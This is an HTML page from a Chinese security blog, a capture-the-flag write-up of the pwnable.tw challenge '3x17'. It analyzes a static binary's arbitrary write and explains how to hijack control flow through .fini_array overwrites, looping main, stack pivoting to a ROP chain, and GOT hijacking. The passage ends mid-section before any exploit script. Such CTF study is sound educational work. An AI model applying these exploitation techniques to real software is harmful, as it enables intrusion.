@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="半年没碰pwnable了，一位朋友让我看的这个题分值不高，也挺简单不过踩了两个坑(方案二三)觉得比较有意思，记录一下 Analyze：静态编译，便于分析，添加sig: 12python lscan.py  -f  .&#x2F;3x17 -S .&#x2F;amd64&#x2F;sig&#x2F;#不过这题没什么用 题目保护： 12345Arch:     amd64-64-littleRELRO">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw_3x17">
+<meta property="og:url" content="http://yoursite.com/2019/02/08/pwnable-tw-3x17/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="半年没碰pwnable了，一位朋友让我看的这个题分值不高，也挺简单不过踩了两个坑(方案二三)觉得比较有意思，记录一下 Analyze：静态编译，便于分析，添加sig: 12python lscan.py  -f  .&#x2F;3x17 -S .&#x2F;amd64&#x2F;sig&#x2F;#不过这题没什么用 题目保护： 12345Arch:     amd64-64-littleRELRO">
+<meta property="article:published_time" content="2019-02-08T07:30:14.000Z">
+<meta property="article:modified_time" content="2019-02-28T04:32:22.000Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>pwnable.tw_3x17</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/02/22/Hgame-2019-PWN/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/02/04/A-Tip-of-PHP-Variable-Name-in-Web-Server/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/02/08/pwnable-tw-3x17/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&text=pwnable.tw_3x17" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&title=pwnable.tw_3x17" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&is_video=false&description=pwnable.tw_3x17" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwnable.tw_3x17&body=Check out this article: http://yoursite.com/2019/02/08/pwnable-tw-3x17/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&title=pwnable.tw_3x17" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&title=pwnable.tw_3x17" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&title=pwnable.tw_3x17" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&title=pwnable.tw_3x17" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&name=pwnable.tw_3x17&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze："><span class="toc-number">1.</span> <span class="toc-text">Analyze：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#方案一"><span class="toc-number">1.1.</span> <span class="toc-text">方案一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方案二"><span class="toc-number">1.2.</span> <span class="toc-text">方案二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方案三"><span class="toc-number">1.3.</span> <span class="toc-text">方案三</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方案四"><span class="toc-number">1.4.</span> <span class="toc-text">方案四</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">EXP:</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        pwnable.tw_3x17
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-02-08T07:30:14.000Z" itemprop="datePublished">2019-02-08</time>
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>半年没碰pwnable了，一位朋友让我看的这个题<br>分值不高，也挺简单<br>不过踩了两个坑(方案二三)觉得比较有意思，记录一下</p>
+<h2 id="Analyze："><a href="#Analyze：" class="headerlink" title="Analyze："></a>Analyze：</h2><p><strong>静态编译，便于分析，添加sig:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python lscan.py  -f  .&#x2F;3x17 -S .&#x2F;amd64&#x2F;sig&#x2F;</span><br><span class="line">#不过这题没什么用</span><br></pre></td></tr></table></figure>
+<p>题目保护：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found#静态编译，存在canary保护，只是没有检测到</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int result; &#x2F;&#x2F; eax</span><br><span class="line">int v4; &#x2F;&#x2F; eax</span><br><span class="line">char *v5; &#x2F;&#x2F; ST08_8</span><br><span class="line">char buf; &#x2F;&#x2F; [rsp+10h] [rbp-20h]</span><br><span class="line">unsigned __int64 v7; &#x2F;&#x2F; [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">v7 &#x3D; __readfsqword(0x28u);</span><br><span class="line">result &#x3D; (unsigned __int8)++read_flag;</span><br><span class="line">if ( read_flag &#x3D;&#x3D; 1 )</span><br><span class="line">&#123;</span><br><span class="line">  write(1u, &quot;addr:&quot;, 5uLL);</span><br><span class="line">  read(0, &amp;buf, 0x18uLL);</span><br><span class="line">  stroll((__int64)&amp;buf);</span><br><span class="line">  v5 &#x3D; (char *)v4;</span><br><span class="line">  write(1u, &quot;data:&quot;, 5uLL);</span><br><span class="line">  read(0, v5, 0x18uLL);</span><br><span class="line">  result &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line">return result;</span><br></pre></td></tr></table></figure>
+<p>对应汇编：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401B6D ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0000000000401B6D main            proc near               ; DATA XREF: start+1D↑o</span><br><span class="line">.text:0000000000401B6D</span><br><span class="line">.text:0000000000401B6D var_28          &#x3D; qword ptr -28h</span><br><span class="line">.text:0000000000401B6D buf             &#x3D; byte ptr -20h</span><br><span class="line">.text:0000000000401B6D var_8           &#x3D; qword ptr -8</span><br><span class="line">.text:0000000000401B6D</span><br><span class="line">.text:0000000000401B6D ; __unwind &#123;</span><br><span class="line">.text:0000000000401B6D                 push    rbp</span><br><span class="line">.text:0000000000401B6E                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401B71                 sub     rsp, 30h</span><br><span class="line">.text:0000000000401B75                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000401B7E                 mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000401B82                 xor     eax, eax</span><br><span class="line">.text:0000000000401B84                 movzx   eax, cs:read_flag</span><br><span class="line">.text:0000000000401B8B                 add     eax, 1</span><br><span class="line">.text:0000000000401B8E                 mov     cs:read_flag, al</span><br><span class="line">.text:0000000000401B94                 movzx   eax, cs:read_flag</span><br><span class="line">.text:0000000000401B9B                 cmp     al, 1</span><br><span class="line">.text:0000000000401B9D                 jnz     loc_401C35</span><br><span class="line">.text:0000000000401BA3                 mov     [rbp+var_28], 0</span><br><span class="line">.text:0000000000401BAB                 mov     edx, 5          ; count</span><br><span class="line">.text:0000000000401BB0                 lea     rsi, buf        ; &quot;addr:&quot;</span><br><span class="line">.text:0000000000401BB7                 mov     edi, 1          ; fd</span><br><span class="line">.text:0000000000401BBC                 mov     eax, 0</span><br><span class="line">.text:0000000000401BC1                 call    write</span><br><span class="line">.text:0000000000401BC6                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000401BCA                 mov     edx, 18h        ; count</span><br><span class="line">.text:0000000000401BCF                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000401BD2                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401BD7                 mov     eax, 0</span><br><span class="line">.text:0000000000401BDC                 call    read</span><br><span class="line">.text:0000000000401BE1                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000401BE5                 mov     rdi, rax</span><br><span class="line">.text:0000000000401BE8                 mov     eax, 0</span><br><span class="line">.text:0000000000401BED                 call    stroll</span><br><span class="line">.text:0000000000401BF2                 cdqe</span><br><span class="line">.text:0000000000401BF4                 mov     [rbp+var_28], rax</span><br><span class="line">.text:0000000000401BF8                 mov     edx, 5          ; count</span><br><span class="line">.text:0000000000401BFD                 lea     rsi, aData      ; &quot;data:&quot;</span><br><span class="line">.text:0000000000401C04                 mov     edi, 1          ; fd</span><br><span class="line">.text:0000000000401C09                 mov     eax, 0</span><br><span class="line">.text:0000000000401C0E                 call    write</span><br><span class="line">.text:0000000000401C13                 mov     rax, [rbp+var_28]</span><br><span class="line">.text:0000000000401C17                 mov     edx, 18h        ; count</span><br><span class="line">.text:0000000000401C1C                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000401C1F                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401C24                 mov     eax, 0</span><br><span class="line">.text:0000000000401C29                 call    read</span><br><span class="line">.text:0000000000401C2E                 mov     eax, 0</span><br><span class="line">.text:0000000000401C33                 jmp     short loc_401C37</span><br><span class="line">.text:0000000000401C35 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401C35</span><br><span class="line">.text:0000000000401C35 loc_401C35:                             ; CODE XREF: main+30↑j</span><br><span class="line">.text:0000000000401C35                 nop</span><br><span class="line">.text:0000000000401C36                 nop</span><br><span class="line">.text:0000000000401C37</span><br><span class="line">.text:0000000000401C37 loc_401C37:                             ; CODE XREF: main+C6↑j</span><br><span class="line">.text:0000000000401C37                 mov     rcx, [rbp+var_8]</span><br><span class="line">.text:0000000000401C3B                 xor     rcx, fs:28h</span><br><span class="line">.text:0000000000401C44                 jz      short locret_401C4B</span><br><span class="line">.text:0000000000401C46                 call    ___stack_chk_fail</span><br><span class="line">.text:0000000000401C4B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401C4B</span><br><span class="line">.text:0000000000401C4B locret_401C4B:                          ; CODE XREF: main+D7↑j</span><br><span class="line">.text:0000000000401C4B                 leave</span><br><span class="line">.text:0000000000401C4C                 retn</span><br><span class="line">.text:0000000000401C4C ; &#125; &#x2F;&#x2F; starts at 401B6D</span><br><span class="line">.text:0000000000401C4C main            endp</span><br></pre></td></tr></table></figure>
+<p>可以看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">程序静态编译，没有地址随机化，且为任意地址写</span><br><span class="line">.bss段的read_flag记录此函数调用次数，只有read_flag归零时才可再次写</span><br><span class="line">搜索&quot;exit 0&quot;(system function)、&quot;&#x2F;bin&#x2F;sh&quot;、&quot;LINUX - sys_execv&quot;(ida自动注释)......都没有结果</span><br><span class="line">所以应该不存在后门，需要自己构造ROP</span><br><span class="line">或者调用mprotect等方法更改内存权限执行shellcode(下下策)</span><br></pre></td></tr></table></figure>
+<p>首先跟踪整个程序流找到可以控制程序流的地方：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000402960 sub_402960      proc near               ; DATA XREF: start+F↑o</span><br><span class="line">.text:0000000000402960 ; __unwind &#123;</span><br><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100</span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0</span><br><span class="line">.text:000000000040296F                 push    rbx</span><br><span class="line">.text:0000000000402970                 sub     rax, rbp</span><br><span class="line">.text:0000000000402973                 sub     rsp, 8</span><br><span class="line">.text:0000000000402977                 sar     rax, 3</span><br><span class="line">.text:000000000040297B                 jz      short loc_402996</span><br><span class="line">.text:000000000040297D                 lea     rbx, [rax-1]</span><br><span class="line">.text:0000000000402981                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000402988</span><br><span class="line">.text:0000000000402988 loc_402988:                             ; CODE XREF: sub_402960+34↓j</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]</span><br><span class="line">.text:000000000040298C                 sub     rbx, 1</span><br><span class="line">.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:0000000000402994                 jnz     short loc_402988</span><br><span class="line">.text:0000000000402996</span><br><span class="line">.text:0000000000402996 loc_402996:                             ; CODE XREF: sub_402960+1B↑j</span><br><span class="line">.text:0000000000402996                 add     rsp, 8</span><br><span class="line">.text:000000000040299A                 pop     rbx</span><br><span class="line">.text:000000000040299B                 pop     rbp</span><br><span class="line">.text:000000000040299C                 jmp     sub_48E32C</span><br><span class="line">.text:000000000040299C ; &#125; &#x2F;&#x2F; starts at 402960</span><br></pre></td></tr></table></figure>
+<p>其实还有一个地方：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040F7FF                 mov     rdx, [rax+18h]</span><br><span class="line">.text:000000000040F803                 mov     qword ptr [rax+10h], 0</span><br><span class="line">.text:000000000040F80B                 mov     esi, ebp</span><br><span class="line">.text:000000000040F80D                 ror     rdx, 11h</span><br><span class="line">.text:000000000040F811                 xor     rdx, fs:30h</span><br><span class="line">.text:000000000040F81A                 mov     rdi, [rax+20h]</span><br><span class="line">.text:000000000040F81E                 call    rdx</span><br></pre></td></tr></table></figure>
+<p>这里rax=0x4b98e0，也可以写rax+0x18位置，<strong>不过存在xor     rdx, fs:30h，无法预知fs:30h，所以此处不行</strong><br>IP在0x402988时：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RBX  0x1</span><br><span class="line">RBP  0x4b40f0-&gt;.fini_array</span><br></pre></td></tr></table></figure>
+<p><strong>所以只要覆盖.fini_array即可劫持程序流</strong></p>
+<h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p>首先可以确定：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401B84                 movzx   eax, cs:read_flag</span><br><span class="line">.text:0000000000401B8B                 add     eax, 1</span><br><span class="line">.text:0000000000401B8E                 mov     cs:read_flag, al</span><br><span class="line">.text:0000000000401B94                 movzx   eax, cs:read_flag</span><br><span class="line">.text:0000000000401B9B                 cmp     al, 1</span><br></pre></td></tr></table></figure>
+<p><strong>可以想方法通过一个循环来使read_flag字节0x100循环自动归零(0xFF+1-&gt;0)：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">我们将0x4b40f0位置覆盖为0x401b6d(main function addr)</span><br><span class="line">继续跟踪流，当函数返回时，rbx依然为1:</span><br><span class="line">.text:0000000000402988 loc_402988:                             ; CODE XREF: sub_402960+34↓j</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]</span><br><span class="line">.text:000000000040298C                 sub     rbx, 1      #rbx&#x3D;0</span><br><span class="line">.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:0000000000402994                 jnz     short loc_402988  #跳转</span><br><span class="line">-------&gt;</span><br><span class="line">.text:0000000000402988 loc_402988:                             ; CODE XREF: sub_402960+34↓j</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]</span><br><span class="line">#即调用0x4b40f0处的函数地址</span><br><span class="line">因此可以将0x4b40f0重新覆盖为sub_402960</span><br><span class="line">形成sub_402960和main function之间的循环来不断写地址</span><br></pre></td></tr></table></figure>
+<p><strong>可以无限次写入后，便可以布置rop chain<br>而后只需要中断循环并迁移栈段即可：<br>将0x4b40f0覆盖为0x401c4b：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401C4B                 leave</span><br><span class="line">.text:0000000000401C4C                 retn</span><br></pre></td></tr></table></figure>
+<p>此时:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rbp&#x3D;0x4b40f0,rbx&#x3D;0</span><br><span class="line">call    qword ptr [rbp+rbx*8+0] #0x401c4b</span><br><span class="line">-&gt;leave  #rbp&#x3D;0x401c4b,rsp&#x3D;0x4b40f8</span><br><span class="line">-&gt;ret    #rip&#x3D;*0x4b40f8&#x3D;0x401b6d,rsp&#x3D;0x4b4100</span><br><span class="line">-&gt;push    rbp# *0x4b40f8&#x3D;rbp&#x3D;0x401c4b,rsp&#x3D;0x4b40f8</span><br><span class="line">-&gt;mov     rbp, rsp# rbp&#x3D;0x4b40f8</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">-&gt;leave #rbp&#x3D;0x401c4b,rsp&#x3D;0x4b4100</span><br><span class="line">-&gt;ret   #return 2 ropchain</span><br></pre></td></tr></table></figure>
+<h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p><strong>同样是循环main function来无限写</strong><br>不过循环地方不同：<br>可以构造.fini_array:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x4b40f0-&gt;0x4b40f0</span><br><span class="line">0x4b40f8-&gt;0x401b71#sub rsp,0x30......</span><br></pre></td></tr></table></figure>
+<p><strong>这里主要是先进行栈段迁移，再利用不进行push rbp操作造成栈段退出leave ret时rbp依然保持我们构造的fake_rbp,从而造成循环</strong><br>不过这个方案不可行，当循环进可写时，注意到此时：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RBP  0x4b40f0</span><br><span class="line">RSP  0x4b40c8</span><br><span class="line">栈帧长度并不是0x30,而是0x28-&gt;因为我们构造循环时没有进行&quot;push rbp  mov rbp,rsp&quot;，而是直接sub rsp,0x30</span><br></pre></td></tr></table></figure>
+<p>但是注意到main function中:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401BE1                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000401BE5                 mov     rdi, rax</span><br><span class="line">.text:0000000000401BE8                 mov     eax, 0</span><br><span class="line">.text:0000000000401BED                 call    stroll</span><br><span class="line">.text:0000000000401BF2                 cdqe</span><br><span class="line">.text:0000000000401BF4                 mov     [rbp+var_28], rax</span><br><span class="line">.text:0000000000401BF8                 mov     edx, 5          ; count</span><br><span class="line">.text:0000000000401BFD                 lea     rsi, aData      ; &quot;data:&quot;</span><br><span class="line">.text:0000000000401C04                 mov     edi, 1          ; fd</span><br><span class="line">.text:0000000000401C09                 mov     eax, 0</span><br><span class="line">.text:0000000000401C0E                 call    write</span><br><span class="line">.text:0000000000401C13                 mov     rax, [rbp+var_28]</span><br><span class="line">.text:0000000000401C17                 mov     edx, 18h        ; count</span><br><span class="line">.text:0000000000401C1C                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000401C1F                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401C24                 mov     eax, 0</span><br><span class="line">.text:0000000000401C29                 call    read</span><br></pre></td></tr></table></figure>
+<p><strong>我们任意地址读的地址是在保存在rbp+var_28中，其间调用了一次write,因而会将返回地址覆盖到rbp+var_28处，从而导致后面操作失败</strong>，因此本方案需要main function的栈帧提高8 bytes(sub rsp,0x38)</p>
+<h3 id="方案三"><a href="#方案三" class="headerlink" title="方案三"></a>方案三</h3><p>首先考虑的一个方案<br>可以让返回地址为(.fini_array):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401BA3                 mov     [rbp+var_28], 0</span><br></pre></td></tr></table></figure>
+<p>此时已进行完read_flag位的检测,不过要想办法绕过canary：<br><strong>跟踪___stack_chk_fail程序流就可以发现有几处通过.plt表实现调用：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">.text:000000000041337F                 call    sub_4010C0</span><br><span class="line">and</span><br><span class="line">.text:00000000004132F9                 call    sub_401058</span><br></pre></td></tr></table></figure>
+<p><strong>所以第一次劫持程序流后可以修改对应got表中的数据实现永久劫持(只需要永远不绕过canary)</strong><br>这样直接可以无限次地址写<br>不过这样便无法迁移栈段，而且：</p>
